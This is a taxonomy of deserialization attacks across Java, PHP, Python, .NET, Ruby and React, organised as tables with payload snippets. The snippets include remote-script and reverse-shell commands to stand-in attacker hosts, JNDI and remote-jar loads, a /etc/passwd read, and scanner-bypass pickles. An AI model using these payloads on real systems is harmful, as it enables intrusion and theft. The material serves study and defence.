# Deserialization Vulnerability Mutation/Variation Taxonomy

---

## Classification Structure

Deserialization vulnerabilities arise when an application reconstructs objects from serialized data without adequate validation, allowing attackers to inject malicious objects, trigger unintended code paths, or corrupt application state. The attack surface is vast because serialization is a fundamental mechanism across virtually every programming language and framework — from Java's `ObjectInputStream` to Python's `pickle`, PHP's `unserialize()`, .NET's `BinaryFormatter`, Ruby's `Marshal`, and modern formats like React's Flight protocol.

This taxonomy organizes the entire deserialization attack surface along three axes:

- **Axis 1 (Mutation Target):** *What structural component of the serialized data or deserialization process is being manipulated?* This is the primary organizational axis — it defines the top-level sections (§1–§9).
- **Axis 2 (Exploitation Effect):** *What security-relevant outcome does the mutation produce?* Cross-cutting effects include: **Remote Code Execution (RCE)**, **Type Confusion**, **Property/Prototype Injection**, **Authentication Bypass**, **Denial of Service (DoS)**, **Information Disclosure**, and **Privilege Escalation**.
- **Axis 3 (Attack Scenario):** *In what architectural context is this exploitable?* Scenarios include: direct endpoint exploitation, supply-chain poisoning (ML models, packages), nested/chained deserialization, WAF/filter bypass, and framework-specific exploitation.

| Axis 2: Effect | Description |
|---|---|
| **RCE** | Arbitrary code/command execution on the target system |
| **Type Confusion** | Substituting an unexpected type to alter control flow or bypass checks |
| **Property/Prototype Injection** | Injecting or overriding object properties to corrupt application state |
| **Auth Bypass** | Circumventing authentication or authorization through data manipulation |
| **DoS** | Resource exhaustion or crash via malformed serialized data |
| **Info Disclosure** | Leaking sensitive data (files, secrets, memory) via deserialization side-effects |
| **Privilege Escalation** | Elevating access rights by manipulating serialized identity/role data |

### Foundational Concept: The Deserialization Primitive

All deserialization attacks share a common structural root: the serialization format encodes not just *data* but also *behavior* — type information, object reconstruction logic, or executable callbacks. When an application deserializes untrusted input, the attacker controls which types are instantiated and which methods are invoked, turning a data-parsing operation into a code-execution primitive. The specific exploitation path depends on:

1. **Format expressiveness** — Whether the format can encode arbitrary types (pickle, Marshal, BinaryFormatter) or is constrained (JSON, XML)
2. **Magic method / callback surface** — Which methods are automatically invoked during deserialization (`__reduce__`, `__wakeup`, `readObject`, `finalize`)
3. **Gadget availability** — What exploitable code exists on the application's classpath/import path
4. **Filter/sandbox coverage** — Whether deserialization filters exist and how completely they restrict dangerous types

---

## §1. Gadget Chain Construction

Gadget chains are sequences of existing application or library code ("gadgets") that, when triggered through deserialization callbacks, chain together to produce a security-relevant effect — most commonly RCE. This is the most extensively researched dimension of deserialization attacks.

### §1-1. Property-Oriented Programming (POP) Chains

POP chains exploit object-oriented programming semantics: by controlling which objects are instantiated and what property values they hold, an attacker can direct the flow of execution through existing methods that were never intended to interact.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Classic Library Gadgets** | Leveraging well-known library classes (e.g., `InvokerTransformer`, `TemplatesImpl`, `PriorityQueue`) to chain from deserialization callback to `Runtime.exec()` or equivalent | Target library present on classpath; gadget classes not filtered |
| **Framework-Specific Gadgets** | Exploiting framework internals (e.g., Laravel POP chains via `PendingBroadcast`, Spring gadgets via `JdbcRowSetImpl`) | Framework version with exploitable internal classes |
| **Custom Application Gadgets** | Mining the application's own codebase for exploitable method chains, often through manual code review or automated analysis | Application classes with dangerous operations in magic methods |
| **Cross-Library Composition** | Combining gadgets from multiple libraries — the initial trigger from library A chains into a sink in library B | Multiple libraries present simultaneously; no single library contains a complete chain |

**Payload — Java Commons Collections (CC1 chain, ysoserial):**
```bash
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
# Generates: PriorityQueue → TransformingComparator → InvokerTransformer → Runtime.exec()
```

**Payload — PHP Laravel POP chain (PHPGGC):**
```bash
phpggc Laravel/RCE1 system "id" -b
# Generates: PendingBroadcast.__destruct() → Dispatcher.dispatch() → system("id")
```

### §1-2. Dormant and Latent Gadgets

Recent research (2025) has revealed that gadget chains can exist in a *dormant* state — not yet exploitable but activatable through minor code changes in dependencies.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Dormant Gadgets** | Gadget chains that become exploitable when a dependency is updated, a method signature changes, or a new class is added; ~26% of 533 analyzed dependencies contain modification patterns that activate gadget chains | Dependency update or minor code change bridges a gap in the chain |
| **Version-Sensitive Gadgets** | Chains that work only in specific version ranges of a library (e.g., Commons Collections 3.x vs 4.x use different transformer classes) | Target runs a specific vulnerable version |
| **Supply-Chain Injected Gadgets** | Malicious code changes introduced through compromised dependencies that stealthily complete previously incomplete gadget chains | Compromised package in dependency tree |

### §1-3. Automated Gadget Chain Mining

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Call-Graph Based Mining** | Static analysis tools construct call graphs from deserialization entry points and trace paths to dangerous sinks (e.g., `Runtime.exec()`, file write, JNDI lookup) | Sufficient code coverage in static analysis |
| **Deserialization-Guided Construction (FLASH)** | Hybrid dispatch technique that resolves callees based on controllability of receiver variables, discovering 5 previously unknown exploitation methods (USENIX Security 2025) | Advanced static analysis with deserialization-aware type resolution |
| **Fuzzing-Based Discovery (ODDFuzz)** | Structure-aware directed greybox fuzzing that generates valid serialized objects and mutates them to discover exploitable chains | Access to target application for dynamic testing |
| **Overriding-Guided Generation** | Mining chains by analyzing method overriding hierarchies to identify where attacker-controlled types can substitute for expected types (ICSE 2023) | Polymorphic dispatch in deserialization path |

---

## §2. Type Metadata Manipulation

Serialization formats that encode type information (class names, type tags, format identifiers) create an attack surface where the attacker controls *which* class is instantiated during deserialization.

### §2-1. Type Tag Injection

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Explicit Type Specification** | Injecting type identifiers in formats that support polymorphic deserialization (e.g., Java's serialized class descriptor, .NET's `TypeNameHandling`, Jackson's `@class` property, JSON.NET's `$type`) | Polymorphic type resolution enabled on untrusted data |
| **Class Name Substitution** | Replacing the expected class name with a dangerous class (e.g., substituting `java.util.HashMap` with `org.apache.commons.collections.functors.InvokerTransformer`) | No allowlist restricting deserializable types |
| **Nested Type Embedding** | Embedding type metadata within nested data structures so that inner deserialization processes instantiate dangerous types even when outer layers are filtered | Recursive/nested deserialization (§5-1) |
| **Generic Type Parameter Abuse** | Exploiting generic type erasure or reification differences to substitute type parameters with dangerous concrete types | Language-specific generic type handling |

**Payload — Jackson Polymorphic Type Injection:**
```json
["org.apache.xbean.propertyeditor.JndiConverter", {"asText":"ldap://attacker.com/Exploit"}]
```

**Payload — JSON.NET $type Injection:**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": { "FileName": "cmd", "Arguments": "/c calc" }
  }
}
```

### §2-2. Type Confusion via Data Type Substitution

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Integer-String Confusion** | Replacing a string value with an integer (e.g., `0`) to exploit loose comparison operators — in PHP < 8.0, `0 == "password_string"` evaluates to `true`, enabling authentication bypass | PHP < 8.0 with loose comparison (`==`) on deserialized values |
| **Array-Object Confusion** | Substituting an expected object with an array (or vice versa) to trigger different code paths or bypass validation | Language-specific type coercion in deserialized data handling |
| **Null Type Injection** | Injecting null values where objects are expected to trigger null-pointer exceptions, bypass initialization checks, or skip validation logic | Application does not validate null after deserialization |
| **Wrapper Type Abuse** | In languages with wrapper types (e.g., Java `Integer` vs `int`), substituting wrapper for primitive to exploit boxing/unboxing behavior or `equals()` vs `==` semantics | Type-sensitive comparison or casting logic |

**Payload — PHP Integer-String Confusion (Auth Bypass):**
```
# Original:   O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:6:"secret";}
# Tampered:   O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
# In PHP < 8.0: (0 == "secret") → true → auth bypassed
```

### §2-3. Polymorphic Deserialization Abuse

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Jackson Polymorphic Typing** | When Jackson's `DefaultTyping` or `@JsonTypeInfo` is enabled, attacker-supplied JSON can specify arbitrary Java classes to instantiate, leading to JNDI injection or RCE via `TemplatesImpl` | `ObjectMapper.enableDefaultTyping()` or annotations on untrusted input |
| **JSON.NET TypeNameHandling** | Setting `TypeNameHandling` to `Auto`, `All`, or `Objects` in Newtonsoft JSON.NET allows `$type` property to control deserialized type | `TypeNameHandling != None` on untrusted data |
| **SnakeYAML Constructor** | SnakeYAML's default `Constructor` allows arbitrary Java class instantiation via `!!` type tags (e.g., `!!javax.script.ScriptEngineManager`) | SnakeYAML < 2.0 or custom unsafe `Constructor` |
| **Flight Protocol Property Expansion** | React's Flight protocol decoder (`reviveModel()`) assigns payload values directly to objects without `hasOwnProperty` checks, enabling prototype pollution → RCE (CVE-2025-55182, CVSS 10.0) | React 19.x Server Components with default configuration |

**Payload — SnakeYAML RCE:**
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader
  [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]
```

**Payload — React Flight Protocol Prototype Pollution (CVE-2025-55182):**
```
# POST body with crafted Flight protocol payload:
# Pollutes Object.prototype via __proto__ → constructor → Function → child_process.execSync
```

---

## §3. Magic Method and Callback Exploitation

Most languages define special methods that are automatically invoked during deserialization. These methods form the *entry point* of gadget chains — the first code that executes under attacker influence.

### §3-1. Language-Specific Magic Methods

| Language | Methods | Behavior |
|---|---|---|
| **Java** | `readObject()`, `readResolve()`, `readExternal()`, `finalize()`, `validateObject()` | Invoked during `ObjectInputStream.readObject()`; `readObject()` is the primary entry point for most Java gadget chains |
| **PHP** | `__wakeup()`, `__destruct()`, `__toString()`, `__call()` | `__wakeup()` fires on `unserialize()`; `__destruct()` fires on garbage collection; both are primary POP chain entry points |
| **Python** | `__reduce__()`, `__reduce_ex__()`, `__setstate__()`, `__getstate__()` | `__reduce__` returns a callable + args tuple that `pickle` executes during reconstruction — effectively arbitrary code execution by design |
| **.NET** | `OnDeserializing()`, `OnDeserialized()`, `ISerializable.GetObjectData()`, finalizers | BinaryFormatter invokes serialization callbacks; `ISerializable` interface allows custom reconstruction |
| **Ruby** | `marshal_load()`, custom `_load()` methods | `Marshal.load()` invokes `marshal_load()` on reconstructed objects; YAML uses `init_with()` |

### §3-2. Callback Chaining Patterns

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Destructor-Triggered Chains** | Exploiting destructor/finalizer methods that perform cleanup operations (file deletion, connection closing) on attacker-controlled paths or resources | Destructor logic that operates on mutable object state |
| **ToString Chains** | Many languages implicitly call `toString()` / `__toString()` during string interpolation or logging, enabling chains through objects whose string conversion has side effects | Deserialized object used in string context |
| **Proxy/Dynamic Dispatch** | Using dynamic proxy objects (Java `InvocationHandler`, PHP `__call()`) to redirect any method call to attacker-controlled logic | Proxy mechanism available in target language |
| **Lazy Initialization Triggers** | Objects with lazy-loaded properties that fetch remote resources or execute code when first accessed post-deserialization | Lazy initialization pattern with external resource fetch |

**Payload — Java HashMap.readObject() kickoff (CC6 chain):**
```java
// HashMap.readObject() → TiedMapEntry.hashCode() → LazyMap.get()
//   → ChainedTransformer.transform() → Runtime.exec("calc")
```

**Payload — PHP __destruct() → __toString() chain:**
```php
// Guzzle/FnStream.__destruct() → close() → __toString()
//   → Symfony/Process.__toString() → getOutput() → system("id")
```

---

## §4. Serialization Format Exploitation

Different serialization formats have distinct security properties. This section covers format-specific attack vectors and cross-format confusion.

### §4-1. Binary Format Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Java ObjectInputStream** | The canonical binary deserialization sink — `ObjectInputStream.readObject()` reconstructs arbitrary object graphs including type metadata, triggering `readObject()` callbacks | Application deserializes untrusted bytes via `ObjectInputStream` |
| **.NET BinaryFormatter** | Microsoft-deprecated (exceptions thrown in .NET 9+) binary formatter that invokes deserialization callbacks; cannot be secured and should never be used with untrusted data | Legacy .NET application still using `BinaryFormatter` |
| **Python Pickle Protocol** | Stack-based VM that can execute arbitrary Python functions during deserialization via `__reduce__`; security by design is impossible — any pickle from untrusted source is exploitable | `pickle.loads()` on untrusted data, any Python version |
| **Ruby Marshal** | Binary format that reconstructs arbitrary Ruby objects; `Marshal.load()` on untrusted data enables RCE via gadget chains in loaded libraries | `Marshal.load()` on untrusted data |
| **PHP serialize/unserialize** | Text-based but structurally binary format encoding type, length, and value; `unserialize()` triggers `__wakeup()` and `__destruct()` on reconstructed objects | `unserialize()` on untrusted data |

**Payload — Python Pickle RCE (minimal):**
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))
pickle.dumps(Exploit())  # Deserializing this executes os.system("id")
```

**Payload — .NET BinaryFormatter (ysoserial.net):**
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
```

**Payload — Ruby Marshal RCE:**
```ruby
# Gadget: Gem::Installer → Gem::SpecFetcher → system()
Marshal.dump(malicious_object)  # Deserializing triggers RCE
```

### §4-2. Text/Structured Format Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **YAML Arbitrary Object Instantiation** | YAML's tag system (`!!python/object`, `!!ruby/object`, `!!javax.script.ScriptEngineManager`) allows specifying arbitrary types for deserialization | Unsafe YAML loader (`yaml.load()` without `SafeLoader`, SnakeYAML default `Constructor`) |
| **JSON Polymorphic Type Abuse** | JSON libraries with type-discriminator features allow class specification within JSON data (Jackson `@class`, JSON.NET `$type`, Fastjson `@type`) | Polymorphic deserialization enabled on JSON parser |
| **XML External Entity (XXE) via Deserialization** | XML deserialization can trigger XXE when the XML parser processes external entities embedded in serialized data; can be chained with nested deserialization (§5-1) for amplified impact | XML parser with external entity processing enabled; nested deserialization |
| **MessagePack/CBOR Extension Types** | Binary-efficient formats with extension type mechanisms that may allow arbitrary type instantiation in certain library implementations | Library implementation that resolves extension types to arbitrary classes |

**Payload — PyYAML RCE:**
```yaml
!!python/object/apply:os.system ["id"]
```

**Payload — Fastjson @type injection (Java):**
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### §4-3. Domain-Specific Format Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **PHAR Metadata Deserialization** | PHP Archive (PHAR) files contain serialized metadata that is automatically deserialized when accessed via `phar://` stream wrapper; pre-PHP 8.0, even `file_exists('phar://...')` triggers deserialization | PHP < 8.0 (automatic trigger) or explicit `Phar::getMetadata()` call on attacker-controlled PHAR file |
| **ViewState Deserialization (.NET)** | ASP.NET ViewState is a serialized representation of page state; if MAC validation is disabled or the key is known, arbitrary objects can be injected | ViewState MAC validation disabled, or machine key leaked/weak |
| **JWT Claims Deserialization** | Some JWT implementations deserialize claims payloads using unsafe deserializers rather than plain JSON parsing | JWT library using unsafe deserialization for claims (e.g., Java implementations using `ObjectInputStream`) |
| **React Flight Protocol** | React Server Components use the Flight protocol to serialize/deserialize component trees; the decoder's implicit property expansion enables prototype pollution → RCE (CVE-2025-55182) | React 19.x RSC with unpatched Flight protocol decoder |
| **ML Model Serialization Formats** | Machine learning models serialized with pickle (PyTorch `.pt`/`.pth`), Keras (`.keras` config.json tampering), or joblib contain executable code that runs on `model.load()` | Loading untrusted ML models from public repositories |

**Payload — PHAR polyglot (GIF header + serialized PHP object):**
```
GIF89a<?php __HALT_COMPILER(); ?>
[PHAR manifest with serialized POP chain in metadata]
# Trigger: file_exists("phar://uploads/avatar.gif")  (PHP < 8.0)
```

**Payload — ViewState RCE (ysoserial.net):**
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e <base64>" --validationkey=<leaked_key> --validationalg="SHA1"
```

---

## §5. Deserialization Chain Composition

Complex attacks often combine multiple deserialization steps or chain deserialization with other vulnerability classes to amplify impact.

### §5-1. Nested/Recursive Deserialization

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Multi-Layer Deserialization** | A deserialized object itself contains serialized data that triggers a second round of deserialization, potentially using a different (less restrictive) deserializer; exemplified by CVE-2024-34102 (Magento "CosmicSting") where JSON deserialization triggers XML parsing → XXE | Application performs multi-stage deserialization across format boundaries |
| **Format-Crossing Chains** | Chaining serialization formats — e.g., JSON → XML → PHP unserialize — where each layer bypasses different security controls | Multiple deserialization frameworks in the processing pipeline |
| **Deserialize-then-Interpret** | First deserialization produces a data structure that is then passed to a template engine, expression evaluator, or script interpreter, creating an indirect code execution path | Deserialized data used as input to an interpreter/evaluator |

### §5-2. Cross-Vulnerability Chaining

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Deserialization → JNDI Injection** | Gadget chain triggers a JNDI lookup to an attacker-controlled LDAP/RMI server, which serves a malicious object for remote class loading (Log4Shell-adjacent pattern) | Java application with JNDI enabled; network access to attacker server |
| **Deserialization → SSRF** | Deserialized object triggers HTTP requests to internal services (e.g., via URL/HttpURLConnection objects in the gadget chain) | Gadget class that performs network requests during initialization |
| **Deserialization → XXE** | As demonstrated by CVE-2024-34102, deserialization can trigger XML parsing that is vulnerable to XXE, enabling file exfiltration (e.g., Magento's `env.php` containing cryptographic keys) | XML parser invoked within deserialization chain |
| **Deserialization → Template Injection** | Deserialized data feeds into a server-side template engine, enabling SSTI-based RCE | Deserialized values used in template rendering without sanitization |
| **XXE → Key Leak → JWT Forgery → Admin RCE** | Full attack chain: XXE leaks cryptographic keys → forge admin JWT → abuse admin API for RCE; demonstrated in Magento CosmicSting chained with CVE-2024-2961 | Multi-stage exploit with each link enabling the next |
| **Deserialization → Prototype Pollution → RCE** | Deserialization of JavaScript objects enables prototype pollution, which is then escalated to RCE via gadgets in Node.js built-ins (e.g., `child_process.execSync` via `Function` constructor) (CVE-2025-55182) | JavaScript/Node.js server with property-expanding deserializer |

**Payload — Magento CosmicSting (CVE-2024-34102) nested deser → XXE:**
```json
{"dataType": "string", "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/etc/env.php\">]><data>&xxe;</data>"}
```

**Payload — JNDI injection via JdbcRowSetImpl gadget:**
```java
// JdbcRowSetImpl.setDataSourceName("ldap://attacker.com:1389/Exploit")
// JdbcRowSetImpl.setAutoCommit(true)  → triggers JNDI lookup → remote class load → RCE
```

---

## §6. Encoding and Obfuscation Techniques

Attackers manipulate the encoding layer of serialized data to bypass security filters, WAFs, or deserialization-specific defenses.

### §6-1. Encoding Layer Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Base64 Variants** | Serialized payloads encoded in Base64, Base64URL, or custom Base64 alphabets to bypass signature-based detection; double-encoding to evade single-pass decoders | Filter performs only single-pass decoding or doesn't decode at all |
| **Compression Wrapping** | Wrapping serialized data in GZip, Deflate, or other compression streams; Java `ObjectInputStream` transparently handles `GZIPInputStream` wrapping | Filter doesn't decompress before inspection |
| **Unicode/UTF Tricks** | Using alternative Unicode representations (UTF-7, overlong UTF-8, BOM injection) to obscure class names or property names in text-based serialization formats | Text-based deserializer with permissive Unicode handling |
| **Hex/Octal Encoding** | Representing byte values in hex or octal notation in formats that support it, obscuring payload content from pattern-matching filters | Filter uses pattern matching without normalization |

### §6-2. Stream Structure Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Java Stream Header Manipulation** | Modifying Java serialization stream magic bytes, version numbers, or TC_* type codes to evade signature-based detection while remaining valid for `ObjectInputStream` | Filter checks stream header rather than parsing full stream |
| **Padding and Junk Insertion** | Inserting valid but semantically meaningless data in the serialized stream to shift byte offsets and defeat position-based signature matching | Pattern-matching filter with fixed offset expectations |
| **Object Graph Complexity** | Creating deeply nested or highly interconnected object graphs that cause serialized data to exceed scanner buffer sizes or timeout limits | Scanner with resource limits on analysis depth |
| **Alternative Compression Format (7z Bypass)** | Using 7z compression instead of standard ZIP for PyTorch model files — prevents `torch.load()` automatic loading but enables malicious pickle execution before error (nullifAI attack, 2025) | Picklescan or similar scanner doesn't handle non-ZIP archives |

### §6-3. Class Name Obfuscation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Reflection-Based Loading** | Using `Class.forName()` with dynamically constructed class names to evade static class name filters | Filter performs static string matching on class names |
| **Classloader Manipulation** | Loading dangerous classes through alternative classloaders (URLClassLoader, custom classloaders) that bypass the default deserialization filter | Multiple classloaders available in the target environment |
| **Package Renaming/Shading** | Exploiting renamed (shaded) library classes that have different fully-qualified names but identical behavior to known gadget classes | Target application uses shaded/repackaged libraries |
| **Pip-as-Callable Bypass** | Using `pip.main()` as the callable in pickle's `__reduce__` to install malicious packages — evades scanners that blocklist `os.system`, `subprocess`, etc. (CVE-2025-1716) | Picklescan or similar tools with incomplete callable blocklist |

**Payload — Pickle scanner bypass via pip.main() (CVE-2025-1716):**
```python
class Exploit:
    def __reduce__(self):
        return (pip.main, (["install", "evil-package"],))
# Evades: os.system, subprocess.call, exec blocklists
```

**Payload — Base64 double-encoded Java serialized object:**
```
# Original: aced0005... (Java stream magic)
# Layer 1:  rO0ABX... (Base64)
# Layer 2:  ck8wQUJY... (Base64 of Base64)
# WAF sees neither magic bytes nor class names
```

---

## §7. Filter and Sandbox Bypass

Modern systems deploy deserialization filters (JEP 290, allowlists, WAF rules, scanner tools) to mitigate attacks. This section catalogs techniques for circumventing these defenses.

### §7-1. JEP 290 and Java Serialization Filter Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Blocklist Incompleteness** | Exploiting classes not on the blocklist — as new gadget chains are discovered, blocklists become stale; ~46 known gadget chains in ysoserial alone | Blocklist-based (rather than allowlist) filtering approach |
| **Implementation-Specific Gaps** | IBM ORB ignores JEP 290 deserialization filters entirely (CVE-2022-40609), allowing gadget chain exploitation on IBM Java | IBM JDK with ORB-based deserialization |
| **Allowlist Constraint Limitations** | JEP 290 patterns cannot match based on supertype/interface, cannot differentiate array sizes by class, and have no state to track previously deserialized classes | Complex filtering requirements that exceed JEP 290 pattern expressiveness |
| **Java 16+ Reflection Restrictions** | Java 16+ restricts reflection access to internal classes (e.g., `TemplatesImpl`), breaking some gadget chains — but attackers find alternative gadgets in non-internal packages | Java 16+ with older-style gadget chains (forces attacker to find new chains) |

### §7-2. Scanner and Detection Tool Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Broken File Bypass** | Creating intentionally malformed serialized files that execute payload before the parser encounters the error — the scanner fails to parse, but the runtime deserializer processes enough to trigger the payload (nullifAI attack) | Scanner requires complete file parsing; runtime is error-tolerant |
| **Callable Substitution** | Replacing blocklisted callables (e.g., `os.system`) with equivalent but unblocklisted alternatives (e.g., `pip.main()`, `importlib.import_module()`, `builtins.exec`) | Blocklist-based scanner with incomplete callable coverage |
| **Gadget Discovery Automation (PickleCloak)** | Automated tools that discover useful pickle gadgets and apply them to bypass scanner deny-lists | Deny-list based scanning without behavioral analysis |
| **Opcode-Level Obfuscation** | Manipulating pickle opcodes or Java serialization stream instructions to produce semantically equivalent but syntactically different payloads that evade pattern matching | Signature-based detection without semantic understanding |

### §7-3. WAF and Network-Level Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Content-Type Confusion** | Sending serialized payloads with unexpected Content-Type headers (e.g., serialized Java object sent as `application/json`) to bypass WAF rules keyed on content type | WAF rules that inspect based on Content-Type rather than actual content |
| **Chunked/Fragmented Delivery** | Splitting serialized payload across multiple HTTP chunks or requests to evade single-request inspection | WAF that doesn't reassemble chunked transfers before inspection |
| **Parameter Pollution** | Sending the serialized payload in a parameter name or location that the WAF doesn't inspect (e.g., cookie vs. body, query parameter vs. header) | WAF with incomplete parameter coverage |

---

## §8. Language and Platform-Specific Attack Vectors

### §8-1. Java Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Commons Collections Chains** | The foundational gadget chains — `TransformedMap`, `LazyMap`, `InvokerTransformer` — enabling arbitrary method invocation through transformer chains; CC1-CC7 variants target different collection classes and Java versions | Apache Commons Collections 3.x or 4.x on classpath |
| **TemplatesImpl Code Execution** | Loading attacker-supplied bytecode through `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, which compiles and instantiates arbitrary Java classes | Internal Xalan classes accessible (pre-Java 16 unrestricted; post-16 via module opens) |
| **JNDI Injection Gadgets** | Gadgets that trigger JNDI lookups (`JdbcRowSetImpl`, `JMXConnector`) to attacker-controlled naming services, enabling remote class loading | JNDI enabled; network egress to attacker server; Java version allowing remote classloading |
| **Spring Framework Gadgets** | Spring-specific deserialization vectors through `MethodInvokeTypeProvider`, `ObjectFactoryDelegatingInvocationHandler`, and Spring Expression Language (SpEL) injection via deserialized data | Spring Framework on classpath |
| **RMI/IIOP Transport** | Java Remote Method Invocation and CORBA IIOP natively use Java serialization for parameter passing, making RMI endpoints inherent deserialization sinks | Exposed RMI/IIOP endpoint accepting remote connections |

**Payload — ysoserial CommonsCollections5 (Java 8+):**
```bash
java -jar ysoserial.jar CommonsCollections5 "curl attacker.com/shell.sh | bash"
# BadAttributeValueExpException.readObject() → TiedMapEntry.toString()
#   → LazyMap.get() → ChainedTransformer → Runtime.exec()
```

**Payload — Spring SpEL injection via deserialized MethodInvokeTypeProvider:**
```java
// Deserialized TypeProvider evaluates:
// T(java.lang.Runtime).getRuntime().exec("calc")
```

### §8-2. Python Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Pickle __reduce__ RCE** | The canonical Python deserialization attack: `__reduce__` returns `(os.system, ("cmd",))` — the pickle VM directly calls the function with the supplied arguments; no gadget chain needed | `pickle.loads()` on untrusted data |
| **Pickle Opcode Engineering** | Crafting raw pickle opcodes (GLOBAL, STACK_GLOBAL, INST, OBJ, REDUCE, BUILD) to construct complex payloads that evade high-level detection | Pickle opcode-level manipulation capability |
| **PyYAML Code Execution** | `yaml.load()` with default `Loader` (pre-6.0) or `FullLoader` processes `!!python/object/apply` tags, enabling arbitrary function calls | Unsafe YAML loader on untrusted input |
| **Shelve/DBM Deserialization** | Python's `shelve` module uses pickle internally; opening an untrusted shelf file triggers arbitrary pickle deserialization | Application opens untrusted shelve/dbm files |
| **Joblib Exploitation** | `joblib.load()` uses pickle for Python objects; widely used in ML pipelines for model persistence | Loading untrusted joblib files |

**Payload — Pickle opcode-level reverse shell:**
```python
import pickle
# Raw opcodes: GLOBAL 'os' 'system' + MARK + SHORT_BINUNICODE 'bash -i >& ...' + TUPLE + REDUCE
payload = b"\x80\x04\x95...\x8c\x02os\x8c\x06system\x93\x8c\x1dbash -i >& /dev/tcp/x/4444 0>&1\x85R."
```

**Payload — PyYAML !!python/object/apply (multi-step):**
```yaml
!!python/object/apply:subprocess.check_output
  args: [["cat", "/etc/passwd"]]
```

### §8-3. PHP Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **POP Chain via Magic Methods** | Chaining `__wakeup()` → `__toString()` → `__call()` → `__destruct()` through framework classes (Laravel, Symfony, WordPress) to reach dangerous sinks like `system()`, `eval()`, `file_put_contents()` | Framework classes with exploitable magic methods on autoload path |
| **PHAR Stream Wrapper** | `phar://` stream wrapper triggers deserialization of PHAR metadata; pre-PHP 8.0, even read-only operations like `file_exists()`, `getimagesize()`, `is_dir()` trigger deserialization | PHP < 8.0 with file operation on attacker-controlled path; or explicit metadata access |
| **Polyglot PHAR Files** | Creating files that are simultaneously valid images (JPEG, GIF, PNG) and valid PHAR archives, bypassing file-type validation while remaining exploitable via `phar://` | Image upload functionality + `phar://` accessible path |
| **Session Deserialization** | PHP sessions use `serialize()`/`unserialize()` by default; session handler misconfiguration or session file injection enables POP chain activation | Session handler processing attacker-influenced session data |
| **SoapClient SSRF** | Deserializing a crafted `SoapClient` object triggers SSRF when any method is subsequently called on it, as it makes SOAP requests to the attacker-specified URL | `SoapClient` class available; deserialized object's methods are called |

**Payload — PHP SoapClient SSRF:**
```php
O:10:"SoapClient":4:{s:3:"uri";s:1:"/";s:8:"location";s:25:"http://169.254.169.254/...";
  s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}
# Triggers SSRF on any method call: $obj->anything() → HTTP request to location
```

**Payload — PHPGGC Symfony/RCE4:**
```bash
phpggc Symfony/RCE4 exec "whoami" -b
# Output: base64-encoded serialized object
# Chain: ProcessPipes.__destruct() → WindowsPipes.close() → Process.run() → exec("whoami")
```

### §8-4. .NET Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **BinaryFormatter Chains** | ysoserial.net provides gadget chains for `ObjectDataProvider`, `TextFormattingRunProperties`, `TypeConfuseDelegate`, and others targeting BinaryFormatter, deprecated but still present in legacy applications | Legacy .NET application using BinaryFormatter |
| **DataContractSerializer Abuse** | When configured with known types or `DataContractResolver`, `DataContractSerializer` can instantiate arbitrary types specified in XML type attributes | `DataContractSerializer` with permissive type resolution |
| **ViewState Exploitation** | Unprotected ASP.NET ViewState can be deserialized with malicious payloads; requires knowledge of the machine key (which may be hardcoded, leaked, or brute-forced) | Machine key known or MAC validation disabled |
| **JSON.NET $type Injection** | `TypeNameHandling` settings other than `None` enable `$type` property to control deserialized type, allowing instantiation of dangerous types like `ObjectDataProvider` | `TypeNameHandling != None` in Newtonsoft.Json configuration |
| **DataSetSurrogateSelector Bypass** | Type-confusion attack defeating `DataSetSurrogateSelector` allowlist via generic-wrapper instantiation, reaching `TemplateParser` for deserializing gadget activation (Top 10 Web Hacking 2025 nomination) | Specific .NET framework configuration with DataSet processing |

### §8-5. Ruby Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Marshal.load RCE** | `Marshal.load()` on untrusted data reconstructs arbitrary Ruby objects; gadget chains through ERB templates, Gem::Specification, and other stdlib classes enable RCE | `Marshal.load()` on untrusted input |
| **YAML.load Exploitation** | `YAML.load()` (vs. `YAML.safe_load()`) processes arbitrary Ruby type tags, enabling object instantiation and command execution via `Gem::Installer`, `ERB`, or `Gem::Requirement` gadgets | `YAML.load()` on untrusted YAML data |
